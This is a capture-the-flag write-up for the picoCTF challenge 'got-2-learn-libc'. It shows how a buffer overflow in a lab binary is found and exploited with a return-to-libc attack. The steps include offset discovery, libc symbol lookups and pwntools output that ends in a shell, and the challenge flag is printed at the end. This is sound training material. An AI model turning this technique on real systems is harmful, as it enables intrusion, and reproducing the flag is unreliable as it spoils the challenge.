# got-2-learn-libc
Binary Exploitation - 250 points

## Challenge 
> This [program](vuln) gives you the address of some system calls. Can you get a shell? You can find the program in /problems/got-2-learn-libc_2_2d4a9f3ed6bf71e90e938f1e020fb8ee on the shell server. 

> [Source.](vuln.c)

## Hint
> try returning to systems calls to leak information

> don't forget you can always return back to main()

## Solution

References:

 - https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf
 - https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/
 - https://security.stackexchange.com/questions/168101/return-to-libc-finding-libcs-address-and-finding-offsets

---


Find buffer offset

    $ pwn cyclic 200 | strace ./vuln 
    --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x62616170} ---
    +++ killed by SIGSEGV +++
    Segmentation fault

    $ pwn cyclic -l 0x62616170
    160


Find libc offset
https://security.stackexchange.com/questions/168101/return-to-libc-finding-libcs-address-and-finding-offsets

    $ ldd vuln
        linux-gate.so.1 (0xf76ef000)
        libc.so.6 => /lib32/libc.so.6 (0xf7507000)
        /lib/ld-linux.so.2 (0xf76f0000)

    $ readelf -s /lib32/libc.so.6 | grep fflush
        ...
        103: 00065fd0   291 FUNC    WEAK   DEFAULT   13 fflush@@GLIBC_2.0

    $ readelf -s /lib32/libc.so.6 | grep system
        ...
        1510: 0003d7e0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

Putting into pwntools

    $ python ~/solve.py
    [+] Starting local process './vuln': pid 441090
    ('puts', '0xf7589140')
    ('fflush_addr', '0xf7587330')
    ('useful_string_addr', '0x5656b030')
    
    [*] Switching to interactive mode

    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@IV?junk0\xb0VV
    Thanks! Exiting now...
    $ ls
    flag.txt  vuln    vuln.c
    $ cat flag.txt
    picoCTF{syc4al1s_4rE_uS3fUl_bd99244d}

## Flag

    picoCTF{syc4al1s_4rE_uS3fUl_bd99244d}
